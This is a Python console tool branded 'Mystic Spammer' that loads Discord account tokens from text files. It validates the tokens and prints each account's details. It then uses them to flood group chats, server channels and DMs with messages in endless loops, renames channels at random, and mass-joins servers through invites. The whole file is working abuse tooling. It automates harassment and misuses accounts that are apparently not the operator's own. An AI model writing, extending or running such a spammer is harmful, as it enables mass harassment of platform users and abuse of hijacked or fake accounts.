import ctypes
import os
import platform
import socket
import sys
import time
import threading
import requests
import colorama
from colorama import Fore
import json
import random



GWL_STYLE = -16
WS_MAXIMIZEBOX = 0x00010000
WS_SIZEBOX = 0x00040000

hwnd = ctypes.windll.kernel32.GetConsoleWindow()

style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_STYLE)
style &= ~WS_MAXIMIZEBOX
style &= ~WS_SIZEBOX

ctypes.windll.user32.SetWindowLongW(hwnd, GWL_STYLE, style)
ctypes.windll.user32.DeleteMenu(hwnd, 0xF000, 0x0001)
ctypes.windll.user32.RedrawWindow(hwnd, None, None, 0x0400 | 0x0001)


def get_discord_username(token):
    try:
        headers = {'authorization': token}
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        
       
        if response.status_code == 429:
            retry_after = response.headers.get('Retry-After', 5)  
            print(f'Rate limit exceeded. Waiting for {retry_after} seconds...')
            time.sleep(int(retry_after) + 0)  
            return get_discord_username(token)  
            
        response.raise_for_status()
        user_data = response.json()
        return user_data['username']
    except requests.exceptions.RequestException as e:
        print(f'FAILED TO FETCH DISCORD USERNAME: {e}')
        return None


def read_tokens_from_file(filename):
    try:
        with open(filename, "r") as file:
            tokens = [line.strip() for line in file.readlines() if line.strip()]
        return tokens
    except FileNotFoundError:
        return []


tokens = read_tokens_from_file("tokens.txt")


if not tokens:
    print('NO TOKENS FOUND IN "tokens.txt".')
    time.sleep(2)
    sys.exit(1)


def check_and_remove_tokens(tokens):
    print("Checking and removing invalid tokens...")
    valid_tokens = []

    for token in tokens:
        discord_username = get_discord_username(token)
        if discord_username:
            print(f'Work : {token} / {discord_username}')
            valid_tokens.append(token)
        else:
            print(f'Fail : {token}')

    if valid_tokens:
        print("Removing invalid tokens from the file...")
        with open("tokens.txt", "w") as file:
            file.write("\n".join(valid_tokens))

    time.sleep(2)

def send_messages_to_server(token, server_id, channel_id, message_count=10):
    try:
        headers = {'authorization': token}
        group_titles_file = open("spam_message.txt", "r")
        group_titles = [title.strip() for title in group_titles_file.readlines() if title.strip()]

        for _ in range(message_count):
            try:
                group_title = random.choice(group_titles) if group_titles else None
                response = requests.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=headers,
                    json={"content": f"{group_title}\nHello from your bot!"}
                )
                if response.status_code == 200:
                    print(f'[!] Successfully sent message')
                else:
                    print(f'[-] Error sending message ({token})')
            except requests.exceptions.RequestException as e:
                print(f'[-] Error sending message ({token})')

    except Exception as e:
        print(f"Error sending messages ({token}): {e}")




def disable_maximize_resize():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)
    style &= ~0x00010000  
    style &= ~0x00040000 
    ctypes.windll.user32.SetWindowLongW(hwnd, -16, style)
    ctypes.windll.user32.ShowWindow(hwnd, 3) 


def read_config():
    try:
        with open("config.json", "r") as config_file:
            config = json.load(config_file)
            server_id = config.get("server_id")
            channel_id = config.get("channel_id")
            return server_id, channel_id
    except (FileNotFoundError, Exception):
        return None, None


def get_and_update_current_token_index(current_index):
    next_index = (current_index + 1) % len(tokens)
    return next_index

def get_username():
    if platform.system() == 'Windows':
        return os.getlogin()
    return os.environ.get('USER')


def get_random_group_title():
    try:
        with open("spam_message.txt", "r") as title_file:
            titles = [line.strip() for line in title_file.readlines() if line.strip()]
            return random.choice(titles) if titles else None
    except FileNotFoundError:
        return None


def check_and_remove_tokens(tokens):
    print("Checking and removing invalid tokens...")
    valid_tokens = []

    for token in tokens:
        discord_username = get_discord_username(token)
        if discord_username:
            print(f'Work : {token} / {discord_username}')
            valid_tokens.append(token)
        else:
            print(f'Fail : {token}')

    if valid_tokens:
        print("Removing invalid tokens from the file...")
        with open("tokens.txt", "w") as file:
            file.write("\n".join(valid_tokens))

    time.sleep(2)



def get_user_info(tokens):
    print("Getting user information...")
    for token in tokens:
        try:
            headers = {'authorization': token}
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)

            if response.status_code == 200:
                user_data = response.json()
                username = user_data.get('username')
                user_id = user_data.get('id')
                verified = user_data.get('verified')

                print(f'Token: {token}')
                print(f'Username: {username}')
                print(f'User ID: {user_id}')
                print(f'Verified: {verified}')
                print('-' * 30)

            else:
                print(f'[-] Failed to fetch user information for token: {token} - Status code: {response.status_code}')

        except requests.exceptions.RequestException as e:
            print(f'[-] Error fetching user information for token: {token} - {e}')

    time.sleep(2)


def get_random_group_name():
    try:
        with open("Grup_titles.txt", "r") as name_file:
            names = [line.strip() for line in name_file.readlines() if line.strip()]
            return random.choice(names) if names else None
    except FileNotFoundError:
        return None


def update_group_name(channel_id, token):
    try:
        group_name = get_random_group_name()

        session = requests.Session()
        session.headers.update({'authorization': token})
        response = session.patch(
            f"https://discord.com/api/v9/channels/{channel_id}",
            json={"name": group_name}
        )

        if response.status_code == 200:
            print(f'[!] Successfully grup name updated!')
        else:
            print(f'[-] ERROR Name ({token}): {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'[-] ERROR Name ({token}): {e}')


def spammer(token, server_id, channel_id, update_interval=7, update_chance=0.25):
    try:
        headers = {'authorization': token}
        text_file = open("sub_message.txt", "r")
        group_titles_file = open("spam_message.txt", "r")
        lines = text_file.readlines()
        group_titles = [title.strip() for title in group_titles_file.readlines() if title.strip()]

        for i, line in enumerate(lines):
            try:
              
                if random.random() < update_chance:
                    update_group_name(channel_id, token)

                group_title = random.choice(group_titles) if group_titles else None
                response = requests.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=headers,
                    json={"content": f"{group_title}\n{line}"}
                )
                if response.status_code == 200:
                    print(f'[!] Successfully message send!')
                else:
                    print(f'[-] Error ({token})')
            except requests.exceptions.RequestException as e:
                print(f'[-] Error ({token})')

    except Exception as e:
        print(f"[-] Error in spammer ({token}): {e}")


def server_spammer(server_id, channel_id):
    try:
        headers = {'authorization': ''}
        text_file = open("sub_message.txt", "r")
        group_titles_file = open("spam_message.txt", "r")
        lines = text_file.readlines()
        group_titles = [title.strip() for title in group_titles_file.readlines() if title.strip()]

       
        tokens = read_tokens_from_file("tokens.txt")

        if not tokens:
            print('NO TOKENS FOUND IN "tokens.txt".')
            return

        while True:
            for token in tokens:
                headers['authorization'] = token 

                for i, line in enumerate(lines):
                    try:
                        group_title = random.choice(group_titles) if group_titles else None
                        message_content = f"{group_title}\n{line}"

                        response = requests.post(
                            f"https://discord.com/api/v9/channels/{channel_id}/messages",
                            headers=headers,
                            json={"content": message_content}
                        )

                        if response.status_code == 200:
                            print(f'[!] Successfully sent message')
                        else:
                            print(f'[-] Error sending message ({token})')

                    except requests.exceptions.RequestException as e:
                        print(f'[-] Error sending message ({token})')

                    if i < len(lines) - 1:
                       
                        time.sleep(0)

              

    except Exception as e:
        print(f"Error in server_spammer: {e}")

def dmspammer(server_id, channel_id):
    try:
        headers = {'authorization': ''}
        text_file = open("sub_message.txt", "r")
        group_titles_file = open("spam_message.txt", "r")
        lines = text_file.readlines()
        group_titles = [title.strip() for title in group_titles_file.readlines() if title.strip()]

       
        tokens = read_tokens_from_file("dm_spammer_token.txt")

        if not tokens:
            print('NO TOKENS FOUND IN "dm_spammer_token.txt".')
            return

        total_messages_sent = 0 

        while True:
            for token in tokens:
                headers['authorization'] = token  

                for i, line in enumerate(lines):
                    try:
                        group_title = random.choice(group_titles) if group_titles else None
                        message_content = f"{group_title}\n{line}"

                        response = requests.post(
                            f"https://discord.com/api/v9/channels/{channel_id}/messages",
                            headers=headers,
                            json={"content": message_content}
                        )

                        if response.status_code == 200:
                            total_messages_sent += 1
                            print(f'[!] Successfully sent message ({channel_id}). Total messages sent: {total_messages_sent}')

                           
                            if total_messages_sent % 7 == 0:
                                time.sleep(0.6)
                        else:
                            print(f'[-] Error sending message >>> (400) resset the panel...')
                            time.sleep(11)   

                    except requests.exceptions.RequestException as e:
                        print(f'[-] Error sending message >>> (302) resset the panel...')
                        time.sleep(11)  

                    if i < len(lines) - 1:
                        
                        time.sleep(0.5)

              
                time.sleep(0.9)

    except Exception as e:
        print(f"Error in dmspammer: {e}")





def join_server(server_invite, token):
    try:
        session = requests.Session()
        session.headers.update({'authorization': token})
        response = session.post(f"https://discord.com/api/v9/invites/{server_invite}")
        
        if response.status_code == 200:
            print(f'[!] JOINED SERVER : {server_invite}')
        else:
            print(f'[-] FAIL TO JOIN SERVER ({token}): {server_invite} - {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'[-] FAIL TO JOIN SERVER ({token}): {server_invite} - {e}')


def join_group(invite_link):
    try:
        headers = {'authorization': tokens[0]}  
        response = requests.post(f"https://discord.com/api/v9/invites/{invite_link}", headers=headers)

        if response.status_code == 200:
            print(f'[!] SUCCESSFULLY JOINED GROUP: {invite_link}')
        else:
            print(f'[-] FAIL TO JOIN GROUP: {invite_link} - {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'[-] FAIL TO JOIN GROUP: {invite_link} - {e}')


def add_all_bots_to_server(server_invite):
    try:
        for token in tokens:
            join_server(server_invite, token)
        print("All bots joined the server.")
    except Exception as e:
        print(f'Error adding bots to server: {e}')


def get_join_choice():
    while True:
        try:
            join_choice = int(input('Select an option (1 for server join, 2 for group join): '))
            if join_choice in [1, 2]:
                return join_choice
            else:
                print('Invalid choice. Please enter 1 or 2.')
        except ValueError:
            print('Invalid input. Please enter a number.')



colorama.init()

def print_colored_option(option, color):
    colored_option = f"{color}{option}{colorama.Style.RESET_ALL}"
    print(colored_option)

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

exit_program = threading.Event()

def set_console_size(width, height):
    os.system(f"mode {width},{height}")

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def print_logo():
    logo = """
╔╦╗┬ ┬┌─┐┌┬┐┬┌─┐
║║║└┬┘└─┐ │ ││  
╩ ╩ ┴ └─┘ ┴ ┴└─┘ 
    """
    print(logo)
    print("")

def format_time(elapsed_time):
    units = [('weeks', 86400 * 7), ('days', 86400), ('hours', 3600), ('minutes', 60)]
    for unit, seconds_per_unit in units:
        if elapsed_time >= seconds_per_unit:
            return f"{int(elapsed_time / seconds_per_unit)} {unit}"
    return f"{int(elapsed_time)} seconds"

def update_console_title():
    start_time = time.time()
    while not exit_program.is_set():
        elapsed_time = time.time() - start_time
        elapsed_time_formatted = format_time(elapsed_time)
        set_console_title(f"Mystic Spammer | Runtime... {elapsed_time_formatted} | Version 3")
        time.sleep(1)

def main():
    set_console_size(95, 25)
    title_update_thread = threading.Thread(target=update_console_title)
    title_update_thread.start()

    try:
        while True:
            print_logo()
            print("> 1 - Grup Spammer")                     
            print("> 2 - Get Account's Info")               
            print("> 3 - Grup Joiner")                      
            print("> 4 - Check Tokens All")                 
            print("> 5 - Server Spammer")                   
            print("> 6 - DmSpammer")                        
            print("> 7 - exit")
            print("")
            choice = input("Mystic Spammer$root-> ")

            if choice == '1':
                
                server_id, channel_id = read_config()
                if server_id is None or channel_id is None:
                    print("Error: Server ID or Channel ID is not configured in config.json.")
                    continue

                current_index = 0 
                while True:
                    discord_token = tokens[current_index]
                    discord_username = get_discord_username(discord_token)
                    spammer(discord_token, server_id, channel_id)
                    current_index = get_and_update_current_token_index(current_index)

            elif choice == '2':
              
                get_user_info(tokens)

            elif choice == '3':
                
                server_invite = input('Enter the server invite: ')
                add_all_bots_to_server(server_invite)

            elif choice == '4':
                
                check_and_remove_tokens(tokens)

            elif choice == '5':
                
                server_id, channel_id = read_config()
                if server_id is None or channel_id is None:
                    print("Error: Server ID or Channel ID is not configured in config.json.")
                    continue

                server_spammer(server_id, channel_id)

            elif choice == '6':
                
                server_id, channel_id = read_config()
                if server_id is None or channel_id is None:
                    print("Error: Server ID or Channel ID is not configured in config.json.")
                    continue

                dmspammer(server_id, channel_id)

            elif choice == '7':
               
                break

            else:
                print('Invalid choice. Please enter 1, 2, 3, 4, 5, 6, or 7.')

    finally:
        exit_program.set()
        title_update_thread.join()

if __name__ == "__main__":
    main()
